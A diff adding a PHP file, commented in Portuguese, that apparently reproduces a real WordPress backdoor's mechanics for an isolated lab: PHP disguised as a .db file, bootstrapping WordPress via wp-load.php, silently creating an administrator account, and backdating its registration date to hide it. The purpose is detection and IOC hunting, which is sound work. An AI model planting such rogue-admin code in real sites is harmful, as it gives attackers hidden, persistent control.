@@ -1,0 +1,54 @@
+<?php
+/*
+ * payload.db — BENIGNO, só para laboratório isolado.
+ *
+ * Demonstra, de forma observável e sem dano, as três mecânicas do backdoor real:
+ *   (1) código PHP vivo numa extensão .db, executado via include() pelo loader;
+ *   (2) "load_wp_core": o arquivo é acessado direto (fora do WP) e dá bootstrap
+ *       no WordPress subindo o wp-load.php para ter acesso à API;
+ *   (3) "create_admin_if_missing": garante um admin — aqui, um claramente rotulado.
+ *
+ * Diferença crucial para o malware real: NÃO há gatilho secreto, NÃO há execução
+ * de comando, NÃO há ofuscação ativa. Tudo é legível e o efeito é um único
+ * usuário de teste num banco que você vai jogar fora.
+ */
+
+// (2) bootstrap do core, subindo diretórios até achar wp-load.php.
+$dir = __DIR__;
+for ($i = 0; $i < 6; $i++) {
+    if (file_exists($dir . '/wp-load.php')) {
+        require_once $dir . '/wp-load.php';
+        break;
+    }
+    $dir = dirname($dir);
+}
+
+if (!function_exists('wp_insert_user')) {
+    http_response_code(500);
+    exit("lab: nao consegui dar bootstrap no WP\n");
+}
+
+// (3) cria o "admin fantasma" — rotulado, para você vê-lo aparecer na tabela.
+$login = 'demo_rogue_admin';
+if (!username_exists($login)) {
+    $uid = wp_insert_user([
+        'user_login' => $login,
+        'user_pass'  => wp_generate_password(24, true, true),
+        'user_email' => 'demo_rogue@lab.invalid',
+        'role'       => 'administrator',
+    ]);
+    // data de registro forjada para o passado — exatamente o IOC que caçamos.
+    if (!is_wp_error($uid)) {
+        global $wpdb;
+        $wpdb->update($wpdb->users, ['user_registered' => '2013-05-01 00:00:00'], ['ID' => $uid]);
+    }
+}
+
+// (1) evidência observável de que um .db rodou como PHP.
+@file_put_contents(
+    ABSPATH . 'wp-content/EVIDENCE_shell_ran.txt',
+    '[' . gmdate('c') . "] demo payload.db executado via include() pelo loader\n",
+    FILE_APPEND
+);
+
+echo "lab: demo executado. veja wp-content/EVIDENCE_shell_ran.txt e a tabela de usuarios.\n";
